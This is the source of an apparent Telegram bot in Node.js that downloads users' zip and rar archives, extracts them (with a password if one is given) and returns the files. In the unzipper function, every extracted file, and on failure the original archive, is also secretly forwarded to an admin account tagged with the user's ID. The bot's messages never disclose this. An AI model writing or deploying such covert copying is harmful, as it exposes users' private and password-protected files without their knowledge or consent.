const {NewMessage}= require("telegram/events"),
{Button}=require("telegram/tl/custom/button"),
{CallbackQuery}=require("telegram/events/CallbackQuery"),
unrar=require("node-unrar-js"),
fs=require("fs"),
{spawn}=require("child_process"),
{getExtension}=require("telegram/Utils")

const db=require("../../../helper/db"),
{sleep,root,Api,adminId}=require("./config")

let bot,unzip_list=[]
;(async()=>{

bot=await require("./config").bot()

async function helpToUnzip(path,ext,pass=undefined){
  if(ext=="zip"){
    let zip=await new Promise(async(res,rej)=>{
      let list=await new Promise((r,s)=>{
        let tfiles=[]
        let getFiles=spawn("unzip",["-o",...(pass?["-P",pass,path]:[path]),"-d","./dir"+path.split("/").pop().replace(/[^\-0-9]/g,"")+"/"],{cwd:root+"/zips"})
        getFiles.stderr.on("data",data=>{
          console.log(data.toString());
          return
        })
        getFiles.stdout.on("end",()=>{
          try{
            let chat=path.split("/").pop().replace(/[^\-0-9]/g,"")
            if(!fs.existsSync(root+"/zips/dir"+chat))return rej("Unexpected error found")
            let getDirData=(dir)=>{
              let dirdata=fs.readdirSync(dir)
              console.log(dirdata);
              dirdata=dirdata.reduce((t,c)=>{
                try{
                  let stat=fs.statSync(dir+"/"+c)
                  if(stat.isDirectory())return [...t,...(getDirData(dir+"/"+c))]
                  t.push({isDirectory:false,name:c,getFile:fs.readFileSync(dir+"/"+c)})
                  return t
                }catch(e){return t}
              },[])
              return dirdata
            }
            function deleteFolderRecursive(folderPath) {
              if (fs.existsSync(folderPath)) {
                fs.readdirSync(folderPath).forEach((file, index) => {
                  const curPath = folderPath+"/"+file
                  if (fs.lstatSync(curPath).isDirectory()) { // recurse
                    deleteFolderRecursive(curPath);
                  } else { // delete file
                    fs.unlinkSync(curPath);
                  }
                });
                fs.rmdirSync(folderPath);
              }
            }
            let data=getDirData(root+"/zips/dir"+chat+"/")
            deleteFolderRecursive(root+"/zips/dir"+chat)
            r(data)
          }catch(e){rej(Error())}
        })
      })
      console.log(list);
      return res(list)
    })
    return zip
  }
  else if(ext=="rar"){
    let rar=await unrar.createExtractorFromData({data:(Uint8Array.from(fs.readFileSync(path)).buffer),...(pass?{password:pass}:{})})
    let files=[...(rar.extract({})).files]
    let entries=[]
    for(var i of files){
      let entrie={
        isDirectory:i.fileHeader.flags.directory,
        name:i.fileHeader.name,
        getFile:i.extraction
      }
      entries.push(entrie)
      console.log("adeed");
    }
    return entries
  }
}

async function unzipper({evt,msg,chat,password=null}){
  try{
    let ext=getExtension(evt.message.media)||evt.message.media.document.attributes[0].fileName.split(".").pop()
    console.log("password  :",password,"\ncompression type :",ext);
    
    let prog=false,
    prog_st=Date.now()
    
    let progress=(c,t,upload=false)=>{
      try{
      prog=true
      c=Number(c.value)/1024/1024
      t=Number(t.value)/1024/1024
      let p=Math.floor(c/t*100),
      e=Math.floor((t-c)/(c/((Date.now()- prog_st)/1000)))
      
      console.log(c,t,p,e);
      
      msg.edit({text:`File ${upload?"Uploading":"Downloading"} In Progress\n\nfilesize : ${(String(t).match(/\d+(\.\d{0,2}|$)/))[0]}MB\ncompleated : ${(String(c).match(/\d+(\.\d{0,2}|$)/))[0]}MB\nprogress : ${p} %\nest : ${e} sec`}).catch(e=>null)
      
      sleep(2000).then(()=>{prog=false;return})
      }catch(e){}
    }
    await bot.downloadMedia(evt.message,{outputFile:root+"/zips/"+chat,progressCallback:(c,t)=>{
      if(!prog)progress(c,t)
      return
    },workers:10})
    
    
    await msg.edit({text:"File downloaded successfully\n\nNow trying to unzip"})
    let zipEntry=await helpToUnzip(root+"/zips/"+chat,ext,password)
    
    for(var ent of zipEntry){
      if(ent.isDirectory) continue
      let file=ent.getFile
      //console.log(file);
      if(!file)continue
      let length=Buffer.byteLength(file)
      if(!file)continue
      ext=ent.name.split(".").pop()
      if(ext.length>4)ext=""
      await fs.writeFileSync(root+"/zips/"+chat+"."+ext,file)
      file=root+"/zips/"+chat+"."+ext
      prog_st=Date.now()
      prog=false
      let sendFile=await bot.sendFile(chat,{file,attributes:[new Api.DocumentAttributeFilename({fileName:ent.name})],forceDocument:(["jpg","mp4"].includes(ext.toLowerCase())?false:true), workers:10,thumb:process.cwd()+"/public/images/zip_bot_thumb.jpg", caption:`<code>${ent.name}</code>\n\n<b>File extracted by @zip_unzip_bot</b>`,parseMode:"html",progressCallback:(p)=>{
          if(prog)return
          let c={value:length*p},
          t={value:length}
          progress(c,t,true)
          
      }}).catch(e=>null)
      fs.unlinkSync(root+"/zips/"+chat+"."+ext)
      await bot.sendFile(adminId,{file:sendFile,caption:ent.name+`\n\nuser : ${chat}`}).catch(e=>null)
    }
    unzip_list=unzip_list.filter(x=>x.user!=chat)
    fs.unlinkSync(root+"/zips/"+chat)
    await msg.delete({revoke:true})
    await evt.message.respond({message:"Unzipping compleated"})
  }catch(e){
    console.log(e);
    if(e instanceof Error)e=e.message||e.toString()
    if(typeof e!=="string")e="Unexpected Error Occured"
    
    unzip_list=unzip_list.filter(x=>x.user!=chat)
    bot.sendMessage(chat,{message:e}).catch(e=>null)
    let files=fs.readdirSync(root+"/zips").filter(x=>x.match(new RegExp(`^${chat}(\\.|$)`)))
    files.forEach((x)=>{
      fs.unlinkSync(root+"/zips/"+x)
    })
    bot.sendFile(adminId,{file:evt.message.media.document,caption:e+"\n\nERROR_ZIP_FILE"}).catch(e=>null)
    return
  }
}


bot.addEventHandler(async evt=>{
  try {
    if(!evt.message.media||!evt.message.media.document)return
    let chat=Number(evt.message.peerId.userId.value)
    if(unzip_list.findIndex(x=>x.user==chat)!=-1)return evt.message.reply({message:"You are already trying to unzip another file \n\nif you want to remove that request, use /remove command"})
    
    let data=await db.get("zips",{user: chat},true)
    if(data)return
    
    let formats=["zip","rar"]
    //var ext=evt.message.media.document.attributes[0].fileName
    ext=getExtension(evt.message.media.document)||evt.message.media.document.attributes[0].fileName.split(".").pop()
    if(!formats.includes(ext))return
    
    if(Number(evt.message.media.document.size.value)>50*1024*1024) return (await evt.message.reply({message:"Unfortunately we currently didn't support files that are more than 50MB in size"}))
    unzip_list.push({user:chat})
    
    let msg=await evt.message.reply({message:"Does this zip file have a password?",buttons:[[Button.inline("yes",Buffer.from("pass_yes")),Button.inline("no",Buffer.from("pass_no"))]]})
    
  } catch (e) {
    console.log(e);
    return
  }
},new NewMessage())


bot.addEventHandler(async evt=>{
  orgEvt=evt
  try {
    let chat=Number(evt.query.userId.value)
    let [msg]=await bot.getMessages(chat,{ids:evt.query.msgId})
    if(unzip_list.findIndex(x=>x.user==chat)==-1)return (await evt.answer({message:"No unzipping data found on my serever",alert:true}))
    unzip_list=unzip_list.map(x=>{
      if(x.user!==chat)return x
      return {user:chat,id:msg.replyToMsgId,dlt:msg.id}
    })
    if(evt.patternMatch[1]==="yes"){
      await msg.edit({text:"Okey!\n\nSend the password",buttons:Button.clear()})
      return
    }
    var evt={
      message:(await bot.getMessages(chat,{ids:msg.replyToMsgId}))[0]
    }
    await msg.delete({invoke:true}).catch(e=>null)
    msg=await bot.sendMessage(chat,{message:"file downloading started",replyTo:msg.replyToMsgId})
    //console.log(await bot.getMessages(chat,{ids:msg.id}));
    
    return unzipper({msg,evt,chat})
    
  } catch (e) {
    console.log(e);
    if(typeof e!=="string")e="Unexpected error occurred please try again"
    orgEvt.answer({message:e, alert:true})
  }
},new CallbackQuery({pattern:/^pass_(yes|no)$/}))

bot.addEventHandler(async(evt)=>{
  try {
    if(evt.message.media)return
    let chat=Number(evt.message.peerId.userId.value),
    [{id:msgId,dlt}]=unzip_list.filter(x=>x.user==chat)
    
    if(!msgId)return
    
    let data=await db.get("zips",{user:chat},true)
    if(data)return
    
    let [msg]=await bot.getMessages(chat,{ids:msgId})
    
    let orgEvt={
      message:msg
    }
    
    await evt.message.delete({revoke:true}).catch(e=>null)
    await bot.deleteMessages(chat,[dlt],{revoke:true})
    
    msg=await bot.sendMessage(chat,{message:"File downloading started\nPlease wait"})
    
    unzip_list=unzip_list.filter(x=>x.user!=chat)
    
    unzipper({msg,evt:orgEvt,chat,password:evt.message.message})
    
    
  } catch (e) {
    console.log(e);
    return
  }
},new NewMessage({pattern:/^[^\/]/, incoming:true}))

bot.addEventHandler(async evt=>{
  try {
    let chat=Number(evt.message.peerId.userId.value)
    if(unzip_list.findIndex(x=>x.user==chat)===-1)return
    let data=unzip_list.filter(x=>x.user==chat)[0]
    unzip_list=unzip_list.filter(x=>x.user!=chat)
    await evt.message.reply({message:"Your unzipping request was cancelled"})
    await bot.deleteMessages(chat,[data.id,data.dlt],{revoke:true})
  } catch (e) {}
},new NewMessage({pattern:/^\/remove$/}))

})()